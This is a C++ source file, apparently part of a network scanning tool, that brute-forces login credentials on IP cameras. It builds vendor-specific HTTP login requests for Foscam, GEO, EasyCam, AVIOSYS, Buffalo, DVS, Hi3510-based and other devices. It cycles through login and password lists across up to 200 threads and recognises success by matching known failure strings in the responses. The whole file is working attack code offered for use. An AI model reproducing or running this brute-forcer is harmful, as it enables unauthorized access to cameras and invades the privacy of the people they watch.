#include "STh.h"
#include <libssh/libssh.h>
#include <sstream>
#include <openssl/md5.h>
#include "mainResources.h"
#include "externFunctions.h"
#include "externData.h"
#include "openssl/err.h"
#include "Utils.h"
#include "BruteUtils.h"

int gMaxBrutingThreads = 200;
fd_set write_fs;

bool debugWriteWait = false;
void _DebugWriteHTMLToFile(char *request, char *buff)
{
	while(debugWriteWait) Sleep(50);
	debugWriteWait = true;
	FILE *df = fopen("./debugData.txt", "a");

	if(df != NULL)
	{
		fputs(request, df);
		fputs("==========================\n", df);
		fputs(buff, df);
		fputs("\n==========================\n==========================\n\n", df);
		fclose(df);
	}
	else
	{
		stt->doEmitionRedFoundData("[DEBUG] Cannot open debugData.txt");
	};
	debugWriteWait = false;
}

unsigned char tl(unsigned char d)
{
	if(d >= 192 && d <= 223)
    {
        return (unsigned char)(d + 32);
	}
	else 
	{
		return tolower(d);
	};
}

int recvWT( 
	int Socket, 
	char *Buffer, 
	int Len, 
	long Timeout, 
	int *bTimedOut 
	){ 
		fd_set ReadSet; 
		int n;
		struct timeval Time; 

		FD_ZERO(&ReadSet); 
		FD_SET(Socket,&ReadSet); 
		Time.tv_sec = Timeout; 
		Time.tv_usec = 0; 
        *bTimedOut = false;
		n = select(Socket+1,&ReadSet,NULL,NULL,&Time); 
		if (n > 0) { /* got some data */ 
			return recv(Socket,Buffer,Len,0); 
		} 
		if (n == 0) { /* timeout */ 
            *bTimedOut = true;
		} 
		return(n) ; /* trouble */ 
}

std::string toLowerStr(const char *str)
{
    if(str != NULL) {
        int tsz = strlen(str);
        char *strr = new char[tsz+1];
        ZeroMemory(strr, tsz);

        for (int i = 0; i < tsz; i++)
        {
            strr[i] = tl(str[i]);
        };

        memset(strr + tsz, '\0', 1);

        std::string tstr = std::string(strr);
        delete []strr;
        return tstr;
    } else return "";
}

int _webLoginSeq(char *request, char *login, char *pass, const char *ip, int port, int passCounter, char *type, std::vector<char*> negVector)
{
	char recvBuff[256] = {0};
	char recvBuff2[4096] = {0};

	SOCKET sock;
	sockaddr_in sockAddr;
	int bTO; 
	sockAddr.sin_family = AF_INET;  
	sockAddr.sin_port = htons(port);
	HOSTENT *host;  
#if defined(WIN32) || defined(_WIN32) || defined(__WIN32) && !defined(__CYGWIN__)
	if(inet_addr(ip) != INADDR_NONE) sockAddr.sin_addr.S_un.S_addr = inet_addr(ip);  
	else if(host=gethostbyname (ip)) ((unsigned long*) &sockAddr.sin_addr)[0] = ((unsigned long**)host->h_addr_list)[0][0];  
	else 
	{
		return -1;
	};
#else
	if(inet_addr(ip) != INADDR_NONE) sockAddr.sin_addr.s_addr = inet_addr(ip);  
    else if(host=gethostbyname(ip)) ((unsigned long*) &sockAddr.sin_addr)[0] = ((unsigned long**)host->h_addr_list)[0][0];
	else 
	{
		return -1;
	};
#endif
	sock = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
	int cCode = connect(sock, (sockaddr*)&sockAddr, sizeof(sockAddr));
	int cErrCode = WSAGetLastError();

    while(cErrCode == WSAENOTSOCK)
	{
		CSSOCKET(sock);
		sock = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
		cCode = connect(sock, (sockaddr*)&sockAddr, sizeof(sockAddr));
		cErrCode = WSAGetLastError();
        if(gDebugMode) stt->doEmitionDebugFoundData("[" + QString(type) + "][ENOTSOCK] [" + QString(ip) + ":" + QString::number(port) + "]");
	};

	if(cCode != SOCKET_ERROR) 
    {
		Activity += strlen(request);

		if(send(sock, request, strlen(request), 0) == SOCKET_ERROR) 	
		{
			stt->doEmitionRedFoundData("[" + QString(type) + "] Send error! [" + QString(ip) + "]");
			CSSOCKET(sock);
			return 0;
		}
		else 
		{
			if(MapWidgetOpened) stt->doEmitionAddOutData(QString(request));
			int x = 1;
			int xx = 0;
			ZeroMemory(recvBuff2, sizeof(recvBuff2));
			while(xx < 3072)
			{
				ZeroMemory(recvBuff, sizeof(recvBuff));
				x = recvWT(sock, recvBuff, sizeof(recvBuff), gTimeOut + 2, &bTO);
				if(x <= 0) break;
				strncat(recvBuff2, recvBuff, x);
				xx += x;
				Activity += x;
			};

			if(BALogSwitched) stt->doEmitionBAData("Checked " + QString(type) + ": " + QString(ip) + ":" + QString::number(port) + "; login/pass: "+ QString(login) + ":" + QString(pass) + ";	- Progress: (" + QString::number((passCounter/(double)(MaxPass*MaxLogin)) * 100).mid(0, 4) + "%)");

			if(MapWidgetOpened) stt->doEmitionAddIncData(QString(ip), QString(recvBuff2));

			if(strlen(recvBuff2) > 0) {
				bool result = true;
				for(int i = 0; i < negVector.size(); ++i)
				{
					if(strstri(recvBuff2, negVector[i]) != NULL)
					{
						result = false;
						break;
					};
				};

				if(result)
				{
					CSSOCKET(sock);
					return 1;
				};
			}
		};
	};

	CSSOCKET(sock);
	return 0;
}

lopaStr _IPCameraBrute(const char *ip, int port, char *SPEC)
{
	lopaStr lps;
	ZeroMemory(lps.login, sizeof(lps.login));
	ZeroMemory(lps.pass, sizeof(lps.pass));
	ZeroMemory(lps.other, sizeof(lps.other));
	char login[128] = {0};
	char pass[128] = {0};
    char request[1024] = {0};
	int passCounter = 1;

	std::vector<char*> negVector;
	if(strcmp(SPEC, "IPC") == 0)
	{
		negVector.push_back("<UserGroup>Invalid</UserGroup>");
	}
	else if(strcmp(SPEC, "GEO") == 0)
	{
		negVector.push_back("Access denied");
		negVector.push_back("ErrNoSuchUsr.htm");
	}
	else if(strcmp(SPEC, "EasyCam") == 0)
	{
		negVector.push_back("Set-Cookie: usrLevel=-1;path=/");
	}
	else if(strcmp(SPEC, "Foscam") == 0)
	{
		negVector.push_back("<result>0</result>");
		negVector.push_back("<result>-1</result>");
		negVector.push_back("<result>-2</result>");
		negVector.push_back("<result>-3</result>");
		negVector.push_back("<result>-4</result>");
		negVector.push_back("<result>-5</result>");
		negVector.push_back("<result>-6</result>");
		negVector.push_back("<result>-7</result>");
	}
	else if(strcmp(SPEC, "AVIOSYS") == 0)
	{
		negVector.push_back("Password Error");
	}
	else if(strcmp(SPEC, "BUFFALO") == 0)
	{
		negVector.push_back("403 Forbidden");
	}
	else if(strcmp(SPEC, "DVS") == 0)
	{
		negVector.push_back("Non-Existed");
	}
	else if(strcmp(SPEC, "IPCAM") == 0)
	{
		negVector.push_back("var check=\"0\"");
		negVector.push_back("var authLevel =\"0\";");
	}
	else if(strcmp(SPEC, "IEORFOREFOX") == 0)
	{
		negVector.push_back("AAA()");
		negVector.push_back("РРјСЏ РёР»Рё РїР°СЂРѕР»СЊ РЅРµРІРµСЂРЅС‹Рµ!");
		negVector.push_back("Р’РѕР·РІСЂР°С‚");
		negVector.push_back("HTTP/1.0 302 Found");
		negVector.push_back("is incorrect");
	}
	else
	{
		stt->doEmitionRedFoundData("[_IPCameraBrute] No \"SPEC\" specified!");

		strcpy(lps.login, "UNKNOWN");
		return lps;
	};

	for(int i = 0; i < MaxLogin; i++)
	{
        if(!globalScanFlag) break;
		if(strcmp(loginLst[i], " ") == 0) continue;
		ZeroMemory(login, sizeof(login));
		strcpy(login, loginLst[i]);
		for(int j = 0; j < MaxPass; j++)
		{
            if(!globalScanFlag) break;
			if(strcmp(passLst[j], " ") == 0) continue;
			
			ZeroMemory(pass, sizeof(pass));
			strcpy(pass, passLst[j]);

			ZeroMemory(request, sizeof(request));
			if(strcmp(SPEC, "IPC") == 0)
			{
				strcpy(request, "GET /login.xml?user=");
				strcat(request, login);
				strcat(request, "&usr=");
				strcat(request, login);
				strcat(request, "&password=");
				strcat(request, pass);
				strcat(request, "&pwd=");
				strcat(request, pass);
				strcat(request, " HTTP/1.1\r\nHost: ");
				strcat(request, ip);				
				if(port != 80){
					strcat(request, ":");
					char tbuff[16] = {0};
                    sprintf(tbuff, "%d", port);
                    strcat(request, tbuff);
				};
				strcat(request, "\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; us; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: en-US,ru;q=0.9,en;q=0.8\r\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\r\nAccept-Encoding: text, identity, *;q=0\r\nConnection: close\r\n\r\n");
			}
			else if(strcmp(SPEC, "GEO") == 0)
			{
				strcpy(request, "GET /Login.cgi?username=");
				strcat(request, login);
				strcat(request, "&password=");
				strcat(request, pass);
				strcat(request, " HTTP/1.1\r\nHost: ");
				strcat(request, ip);
				if(port != 80){
					strcat(request, ":");
					char tbuff[16] = {0};
                    sprintf(tbuff, "%d", port);
                    strcat(request, tbuff);
				};
				strcat(request, "\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; us; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: en-US,ru;q=0.9,en;q=0.8\r\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\r\nAccept-Encoding: text, identity, *;q=0\r\nConnection: close\r\n\r\n");
			}
			else if(strcmp(SPEC, "EasyCam") == 0)
			{
				strcpy(request, "GET /login.xml?user=");
				strcat(request, login);
				strcat(request, "&usr=");
				strcat(request, login);
				strcat(request, "&password=");
				strcat(request, pass);
				strcat(request, "&pwd=");
				strcat(request, pass);
				strcat(request, " HTTP/1.1\r\nHost: ");
				strcat(request, ip);
				if(port != 80){
					strcat(request, ":");
					char tbuff[16] = {0};
                    sprintf(tbuff, "%d", port);
                    strcat(request, tbuff);
				};
				strcat(request, "\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; us; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: en-US,ru;q=0.9,en;q=0.8\r\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\r\nAccept-Encoding: text, identity, *;q=0\r\nConnection: close\r\n\r\n");
			}
			else if(strcmp(SPEC, "Foscam") == 0)
			{
				strcpy(request, "GET /cgi-bin/CGIProxy.fcgi?usr=");
				strcat(request, login);
				strcat(request, "&pwd=");
				strcat(request, pass);
				strcat(request, "&cmd=logIn&usrName=");
				strcat(request, login);
				strcat(request, "&pwd=");
				strcat(request, pass);
				strcat(request, " HTTP/1.1\r\nHost: ");
				strcat(request, ip);
				if(port != 80){
					strcat(request, ":");
					char tbuff[16] = {0};
                    sprintf(tbuff, "%d", port);
                    strcat(request, tbuff);
				};
				strcat(request, "\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; us; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: en-US,ru;q=0.9,en;q=0.8\r\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\r\nAccept-Encoding: text, identity, *;q=0\r\nConnection: close\r\n\r\n");
			}
			else if(strcmp(SPEC, "AVIOSYS") == 0)
			{
				strcpy(request, "GET /check_user.html?UserName=");
				strcat(request, login);
				strcat(request, "&PassWord=");
				strcat(request, pass);
				strcat(request, " HTTP/1.1\r\nHost: ");
				strcat(request, ip);
				if(port != 80){
					strcat(request, ":");
					char tbuff[16] = {0};
                    sprintf(tbuff, "%d", port);
                    strcat(request, tbuff);
				};
				strcat(request, "\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; us; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: en-US,ru;q=0.9,en;q=0.8\r\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\r\nAccept-Encoding: text, identity, *;q=0\r\nConnection: close\r\n\r\n");
			}
			else if(strcmp(SPEC, "BUFFALO") == 0)
			{
				strcpy(request, "POST /rpc/login HTTP/1.1\r\nHost: ");
				strcat(request, ip);
				if(port != 80){
					strcat(request, ":");
					char tbuff[16] = {0};
                    sprintf(tbuff, "%d", port);
                    strcat(request, tbuff);
				};
				strcat(request, "\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; us; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: en-US,ru;q=0.9,en;q=0.8\r\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\r\nAccept-Encoding: text, identity, *;q=0\r\nConnection: keep-alive");
				int loginLength = strlen(login);
				int passLength = strlen(pass);
				int sz = loginLength + passLength + strlen("user=&password=");
				char *passString = new char[sz + 1];
				ZeroMemory(passString, sizeof(passString));
				strcpy(passString, "user=");
				strcat(passString, login);
				strcat(passString, "&password=");
				strcat(passString, pass);
				strcat(request, "\r\nContent-Length: ");
				char tempBuff[16] = {0};
                sprintf(tempBuff, "%d", sz);
                strcat(request, tempBuff);
				strcat(request, "\r\n\r\n");
				strcat(request, passString);
				delete []passString;
			}
			else if(strcmp(SPEC, "DVS") == 0)
			{
				strcpy(request, "POST /login HTTP/1.1\r\nHost: ");
				strcat(request, ip);
				if(port != 80){
					strcat(request, ":");
                    char tbuff[16] = {0};
                    sprintf(tbuff, "%d", port);
                    strcat(request, tbuff);
				};
				strcat(request, "\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; us; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: en-US,ru;q=0.9,en;q=0.8\r\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\r\nAccept-Encoding: text, identity, *;q=0\r\nConnection: keep-alive");
				int loginLength = strlen(login);
				int passLength = strlen(pass);
				int sz = loginLength + passLength + strlen("langs=en&user=&password=&submit=+Login+");
				char *passString = new char[sz + 1];
				ZeroMemory(passString, sizeof(passString));
				strcpy(passString, "langs=en&user=");
				strcat(passString, login);
				strcat(passString, "&password=");
				strcat(passString, pass);
				strcat(passString, "&submit=+Login+");
				strcat(request, "\r\nContent-Length: ");
				char tempBuff[16] = {0};
                sprintf(tempBuff, "%d", sz);
                strcat(request, tempBuff);
				strcat(request, "\r\n\r\n");
				strcat(request, passString);
				delete []passString;
			}
			else if(strcmp(SPEC, "IPCAM") == 0)
			{
				strcpy(request, "GET /cgi-bin/hi3510/checkuser.cgi?&-name=");
				strcat(request, login);
				strcat(request, "&-passwd=");
				strcat(request, pass);
				strcat(request, "&-time=1416767330831 HTTP/1.1\r\nHost: ");
				strcat(request, ip);
				if(port != 80){
					strcat(request, ":");
					char tbuff[16] = {0};
                    sprintf(tbuff, "%d", port);
                    strcat(request, tbuff);
				};
				strcat(request, "\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; us; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: en-US,ru;q=0.9,en;q=0.8\r\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\r\nAccept-Encoding: text, identity, *;q=0\r\nConnection: close\r\n\r\n");
			
			}
			else if(strcmp(SPEC, "IEORFOREFOX") == 0)
			{
				strcpy(request, "POST /logincheck.rsp?type=1 HTTP/1.1\r\nHost: ");
				strcat(request, ip);
				if(port != 80){
					strcat(request, ":");
					char tbuff[16] = {0};
                    sprintf(tbuff, "%d", port);
                    strcat(request, tbuff);
				};
				strcat(request, "\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; us; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: en-US,ru;q=0.9,en;q=0.8\r\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\r\nAccept-Encoding: text, identity, *;q=0\r\nConnection: keep-alive");
				int loginLength = strlen(login);
				int passLength = strlen(pass);
				int sz = loginLength + passLength + strlen("username=&userpwd=");
				char *passString = new char[sz + 1];
				ZeroMemory(passString, sizeof(passString));
				strcpy(passString, "username=");
				strcat(passString, login);
				strcat(passString, "&userpwd=");
				strcat(passString, pass);
				strcat(request, "\r\nContent-Length: ");
				char tempBuff[16] = {0};
                sprintf(tempBuff, "%d", sz);
                strcat(request, tempBuff);
				strcat(request, "\r\n\r\n");
				strcat(request, passString);
				delete []passString;
			};

			int res = _webLoginSeq(request, login, pass, ip, port, passCounter, SPEC, negVector);

			if(res == 1)
            {
				strcpy(lps.login, loginLst[i]);
				strcpy(lps.pass, passLst[j]);
				return lps;
			}
			else if(res == -1)
            {
				strcpy(lps.login, "UNKNOWN");
				return lps;
			};
			++passCounter;
		};
    };

	strcpy(lps.login, "UNKNOWN");
	return lps;
}

lopaStr _IPCameraBLobby(const char *ip, int port, char *SPEC)
{
	while(BrutingThrds >= gMaxBrutingThreads) Sleep(1000);

    BruteUtils::BConInc();
	lopaStr res = _IPCameraBrute(ip, port, SPEC);
    BruteUtils::BConDec();
	
	return res;
}
